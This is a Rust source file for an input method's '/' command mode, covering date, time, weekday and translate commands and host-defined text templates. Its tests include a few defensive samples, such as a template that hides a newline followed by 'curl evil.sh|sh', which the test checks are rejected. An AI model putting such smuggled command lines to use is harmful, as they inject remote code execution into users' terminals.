//! `/` mode: the built-in date, time and weekday commands, whose rows are the date/time mode's, the translate command, and the command table the host supplies. Letters after `/` filter commands by trigger; a trigger typed out in full lists every reading of its command first. Templates are data: literal text and a closed set of clock placeholders, formatted by `time`, with nothing a table could use to reach anything else.
//!
//! `/fy hello'world` (typed `/fyhello'world`) is the one local input that may leave the machine: the words after the trigger are English for the user's translation service, through `translation_source`, and the answer comes back as a row of its own (`InputSession::apply_command_translation`). Until it does, and whenever no service answers, the row is the English as typed.

use time::format_description::parse_strftime_borrowed;
use time::{Date, Month, PrimitiveDateTime, Time};

use super::date_time::{query_date_time, LocalDateTime, WEEKDAYS};
use crate::types::{CandidateSource, CommandTableEntry, WordItem};

/// Two pages of the nine-row Windows candidate window; typing more of a trigger narrows the list.
pub const RESULT_LIMIT: usize = 18;
/// Commands kept from a host table; the rest are ignored.
pub const TABLE_LIMIT: usize = 256;
pub const TRIGGER_LIMIT: usize = 32;
/// The Windows candidate pipe's text field (`CandidateTextMaxLength` in `shared/contracts/ipc_protocol_limits.h`, the same bound as a quick phrase): a template, and the text it expands to, longer than this could not be delivered.
pub const TEXT_UTF16_LIMIT: usize = 199;

const DEFAULT_DATE_FORMAT: &str = "%Y-%m-%d";
const DEFAULT_TIME_FORMAT: &str = "%H:%M";

/// The built-in commands: the date/time mode's keywords, the translate command, and the title shown beside their rows.
const BUILTINS: [(&[&str], &str); 4] = [
    (&["rq", "riqi", "date"], "日期"),
    (&["sj", "shijian", "time"], "时间"),
    (&["xq", "xingqi", "week"], "星期"),
    (TRANSLATE_TRIGGERS, "翻译"),
];

/// The translate command's triggers, longest first so `fanyi` is not read as `f` followed by text.
const TRANSLATE_TRIGGERS: &[&str] = &["translate", "fanyi", "fy"];

/// The English after a translate trigger, words split at `'` and joined by spaces, with the trigger that introduced it; `None` for any other input, for a trigger with nothing after it, and for input a table trigger begins with, which the user may still be typing as their own command. `table` must have gone through `usable_command_table`.
pub fn translation_source(
    code: &str,
    table: &[CommandTableEntry],
) -> Option<(&'static str, String)> {
    if table.iter().any(|entry| entry.trigger.starts_with(code)) {
        return None;
    }
    let trigger = TRANSLATE_TRIGGERS
        .iter()
        .find(|trigger| code.starts_with(**trigger))?;
    let rest = &code[trigger.len()..];
    if !rest
        .bytes()
        .all(|byte| byte.is_ascii_lowercase() || byte == b'\'')
    {
        return None;
    }
    let text = rest
        .split('\'')
        .filter(|word| !word.is_empty())
        .collect::<Vec<_>>()
        .join(" ");
    (!text.is_empty()).then_some((trigger, text))
}

/// Whether a translate command is being typed, so `'` separates its words rather than ending the mode.
pub fn takes_word_separator(code: &str) -> bool {
    TRANSLATE_TRIGGERS
        .iter()
        .any(|trigger| code.len() > trigger.len() && code.starts_with(trigger))
        && code.ends_with(|letter: char| letter.is_ascii_lowercase())
}

/// The rows that are usable of a host table: valid triggers and templates, the first command of a trigger, at most `TABLE_LIMIT`.
pub fn usable_command_table(table: &[CommandTableEntry]) -> Vec<CommandTableEntry> {
    let mut usable: Vec<CommandTableEntry> = Vec::new();
    for entry in table {
        if usable.len() == TABLE_LIMIT {
            break;
        }
        let trigger_valid = (1..=TRIGGER_LIMIT).contains(&entry.trigger.len())
            && entry.trigger.bytes().all(|byte| byte.is_ascii_lowercase());
        if trigger_valid
            && !usable.iter().any(|kept| kept.trigger == entry.trigger)
            && fits(&entry.template)
            && template_valid(&entry.template)
        {
            usable.push(entry.clone());
        }
    }
    usable
}

/// Generated rows for the letters after `/`, weight `count - index`, at most `RESULT_LIMIT`: commands whose trigger is the input, then commands it begins; table commands before built-in ones. `pinyin` holds the trigger. `table` must have gone through `usable_command_table`.
pub fn query_command(
    code: &str,
    now: &LocalDateTime,
    table: &[CommandTableEntry],
) -> Vec<WordItem> {
    let clock = clock(now);
    let mut rows: Vec<(String, String)> = Vec::with_capacity(RESULT_LIMIT);
    let mut push = |trigger: &str, text: String| {
        if fits(&text) && !rows.iter().any(|(_, kept)| *kept == text) {
            rows.push((trigger.to_owned(), text));
        }
    };
    if let Some((trigger, text)) = translation_source(code, table) {
        push(trigger, text);
    }
    for exact in [true, false] {
        for entry in table {
            if (entry.trigger == code) == exact && entry.trigger.starts_with(code) {
                if let Some(text) = expand(&entry.template, clock.as_ref()) {
                    push(&entry.trigger, text);
                }
            }
        }
        for (aliases, _) in BUILTINS {
            if exact {
                if aliases.contains(&code) {
                    for row in query_date_time(code, now) {
                        push(code, row.word);
                    }
                }
            } else if !aliases.contains(&code) {
                if let Some(alias) = aliases.iter().find(|alias| alias.starts_with(code)) {
                    if let Some(row) = query_date_time(alias, now).into_iter().next() {
                        push(alias, row.word);
                    }
                }
            }
        }
    }
    let count = rows.len().min(RESULT_LIMIT);
    rows.into_iter()
        .take(count)
        .enumerate()
        .map(|(index, (trigger, text))| {
            WordItem::new(
                trigger,
                text,
                (count - index) as i64,
                CandidateSource::Generated,
                "",
            )
        })
        .collect()
}

/// The title shown beside a row of `trigger`.
pub fn command_title<'a>(trigger: &str, table: &'a [CommandTableEntry]) -> Option<&'a str> {
    if let Some(entry) = table.iter().find(|entry| entry.trigger == trigger) {
        return Some(&entry.title);
    }
    BUILTINS
        .iter()
        .find(|(aliases, _)| aliases.contains(&trigger))
        .map(|(_, title)| *title)
}

fn fits(text: &str) -> bool {
    text.encode_utf16().count() <= TEXT_UTF16_LIMIT
}

/// The wall clock as a `time` value, `None` for the zero clock a failed read leaves behind.
fn clock(now: &LocalDateTime) -> Option<PrimitiveDateTime> {
    let month = Month::try_from(u8::try_from(now.month).ok()?).ok()?;
    let date = Date::from_calendar_date(now.year, month, u8::try_from(now.day).ok()?).ok()?;
    let time = Time::from_hms(
        u8::try_from(now.hour).ok()?,
        u8::try_from(now.minute).ok()?,
        u8::try_from(now.second).ok()?,
    )
    .ok()?;
    Some(PrimitiveDateTime::new(date, time))
}

/// Whether every placeholder of the template is one `expand` knows, checked by expanding it against a fixed instant.
fn template_valid(template: &str) -> bool {
    expand(template, Some(&PrimitiveDateTime::MIN)).is_some()
}

/// The template with its placeholders replaced; `None` for a malformed template, for one that needs the clock when there is none, or for text with a control character. A candidate row shows one line, so a newline or tab (literal, or `%n`/`%t` in a format) would reach the application unseen: a line break in a terminal runs whatever follows it.
fn expand(template: &str, clock: Option<&PrimitiveDateTime>) -> Option<String> {
    let mut output = String::with_capacity(template.len());
    let mut rest = template;
    while let Some(open) = rest.find(['{', '}']) {
        if rest.as_bytes()[open] == b'}' {
            return None;
        }
        output.push_str(&rest[..open]);
        let after = &rest[open + 1..];
        let close = after.find(['{', '}'])?;
        if after.as_bytes()[close] == b'{' {
            return None;
        }
        let placeholder = &after[..close];
        rest = &after[close + 1..];
        if placeholder == "weekday" {
            let clock = clock?;
            output.push_str(WEEKDAYS[usize::from(clock.weekday().number_days_from_sunday())]);
            continue;
        }
        let (name, format) = placeholder.split_once(':').unwrap_or((placeholder, ""));
        let format = match (name, format) {
            ("date", "") => DEFAULT_DATE_FORMAT,
            ("time", "") => DEFAULT_TIME_FORMAT,
            ("date" | "time", format) => format,
            _ => return None,
        };
        let items = parse_strftime_borrowed(format).ok()?;
        output.push_str(&clock?.format(&items).ok()?);
    }
    output.push_str(rest);
    (!output.chars().any(char::is_control)).then_some(output)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn now() -> LocalDateTime {
        LocalDateTime {
            year: 2026,
            month: 10,
            day: 1,
            weekday: 4,
            hour: 9,
            minute: 5,
            second: 7,
        }
    }

    fn entry(trigger: &str, title: &str, template: &str) -> CommandTableEntry {
        CommandTableEntry {
            trigger: trigger.to_owned(),
            title: title.to_owned(),
            template: template.to_owned(),
        }
    }

    fn words(rows: &[WordItem]) -> Vec<&str> {
        rows.iter().map(|row| row.word.as_str()).collect()
    }

    #[test]
    fn a_bare_slash_lists_one_reading_of_every_command() {
        let table = usable_command_table(&[entry("sig", "签名", "张三 {date}")]);
        let rows = query_command("", &now(), &table);
        assert_eq!(
            words(&rows),
            ["张三 2026-10-01", "2026年10月1日", "09:05", "星期四"]
        );
        let triggers: Vec<&str> = rows.iter().map(|row| row.pinyin.as_str()).collect();
        assert_eq!(triggers, ["sig", "rq", "sj", "xq"]);
        for (index, row) in rows.iter().enumerate() {
            assert_eq!(row.source, CandidateSource::Generated);
            assert_eq!(row.weight, (rows.len() - index) as i64);
        }
    }

    #[test]
    fn a_complete_builtin_trigger_lists_the_date_time_rows() {
        let rows = query_command("rq", &now(), &[]);
        assert_eq!(rows.len(), 17);
        assert_eq!(rows[0].word, "2026年10月1日");
        assert!(rows.iter().all(|row| row.pinyin == "rq"));
        assert_eq!(query_command("week", &now(), &[])[0].word, "星期四");
    }

    #[test]
    fn templates_with_control_characters_are_dropped() {
        let table = usable_command_table(&[
            entry("sig", "签名", "张三\ncurl evil.sh|sh"),
            entry("tab", "制表", "a\tb"),
            entry("line", "换行", "张三 {date:%n}curl evil.sh|sh"),
            entry("ok", "正常", "张三"),
        ]);
        assert_eq!(table.len(), 1);
        assert_eq!(table[0].trigger, "ok");
    }

    #[test]
    fn letters_filter_commands_by_trigger_prefix() {
        let table = usable_command_table(&[
            entry("sig", "签名", "张三"),
            entry("sj", "时间", "覆盖"),
            entry("addr", "地址", "北京市"),
        ]);
        // The table's own `sj` wins over the built-in one and is listed first as the exact match.
        let rows = query_command("s", &now(), &table);
        assert_eq!(words(&rows), ["张三", "覆盖", "09:05"]);
        assert_eq!(words(&query_command("ad", &now(), &table)), ["北京市"]);
        assert!(query_command("zz", &now(), &table).is_empty());
    }

    #[test]
    fn templates_expand_the_clock_placeholders() {
        let clock = clock(&now());
        let clock = clock.as_ref();
        assert_eq!(
            expand("{date} {time} {weekday}", clock).as_deref(),
            Some("2026-10-01 09:05 星期四")
        );
        assert_eq!(
            expand("{date:%Y年%m月%d日}{time:%H:%M:%S}", clock).as_deref(),
            Some("2026年10月01日09:05:07")
        );
        assert_eq!(expand("纯文本", clock).as_deref(), Some("纯文本"));
        for template in [
            "{clipboard}",
            "a\nb",
            "a\tb",
            "a\u{1b}b",
            "{date:%n}",
            "{time:%t}",
            "{date",
            "date}",
            "{{date}}",
            "{date:%Q}",
            "{time:%",
        ] {
            assert_eq!(expand(template, clock), None, "{template:?}");
        }
    }

    #[test]
    fn unusable_table_rows_are_dropped() {
        let long = "字".repeat(TEXT_UTF16_LIMIT + 1);
        let table = usable_command_table(&[
            entry("", "空", "x"),
            entry("Sig", "大写", "x"),
            entry("s1", "数字", "x"),
            entry(&"a".repeat(TRIGGER_LIMIT + 1), "太长", "x"),
            entry("bad", "占位符", "{clipboard}"),
            entry("big", "太长", &long),
            entry("ok", "第一", "一"),
            entry("ok", "第二", "二"),
        ]);
        assert_eq!(table, [entry("ok", "第一", "一")]);
        let many: Vec<CommandTableEntry> = (0..TABLE_LIMIT + 10)
            .map(|index| {
                let trigger: String = format!("{index:04}")
                    .bytes()
                    .map(|digit| char::from(b'a' + digit - b'0'))
                    .collect();
                entry(&trigger, "t", "x")
            })
            .collect();
        assert_eq!(usable_command_table(&many).len(), TABLE_LIMIT);
    }

    #[test]
    fn a_command_needing_an_unreadable_clock_is_not_shown() {
        let table =
            usable_command_table(&[entry("d", "日期", "{date}"), entry("t", "文本", "文本")]);
        let rows = query_command("", &LocalDateTime::default(), &table);
        assert_eq!(rows[0].word, "文本");
        // The built-in rows read the zero clock the way the date/time mode always has.
        assert!(rows.iter().all(|row| row.pinyin != "d"), "{rows:?}");
    }

    #[test]
    fn titles_come_from_the_table_then_the_builtins() {
        let table = [entry("sig", "签名", "x")];
        assert_eq!(command_title("sig", &table), Some("签名"));
        assert_eq!(command_title("riqi", &table), Some("日期"));
        assert_eq!(command_title("fanyi", &table), Some("翻译"));
        assert_eq!(command_title("nope", &table), None);
    }

    #[test]
    fn the_translate_command_reads_english_after_its_trigger() {
        let source = |code| translation_source(code, &[]);
        assert_eq!(source("fyhello"), Some(("fy", "hello".to_owned())));
        assert_eq!(
            source("fy'hello''world'"),
            Some(("fy", "hello world".to_owned()))
        );
        assert_eq!(source("fanyigood"), Some(("fanyi", "good".to_owned())));
        assert_eq!(
            source("translatecat"),
            Some(("translate", "cat".to_owned()))
        );
        for code in ["", "f", "fy", "fy'", "fanyi", "translate", "rqx", "hello"] {
            assert_eq!(source(code), None, "{code:?}");
        }
        // A table trigger the input begins is the user's own command, not text to send anywhere.
        let table = usable_command_table(&[entry("fyz", "自定义", "x")]);
        assert_eq!(translation_source("fyz", &table), None);
        assert_eq!(translation_source("fy", &table), None);
        assert_eq!(
            translation_source("fyx", &table),
            Some(("fy", "x".to_owned()))
        );

        assert!(takes_word_separator("fyhello"));
        assert!(!takes_word_separator("fy"));
        assert!(!takes_word_separator("fyhello'"));
        assert!(!takes_word_separator("rqx"));
    }

    #[test]
    fn the_translate_command_shows_the_english_until_a_translation_arrives() {
        let rows = query_command("fyhello'world", &now(), &[]);
        assert_eq!(words(&rows), ["hello world"]);
        assert_eq!(rows[0].pinyin, "fy");
        assert_eq!(rows[0].source, CandidateSource::Generated);
        // The bare trigger and the bare `/` have no reading to show for it.
        assert!(query_command("fy", &now(), &[]).is_empty());
        assert!(query_command("", &now(), &[])
            .iter()
            .all(|row| !TRANSLATE_TRIGGERS.contains(&row.pinyin.as_str())));
    }
}
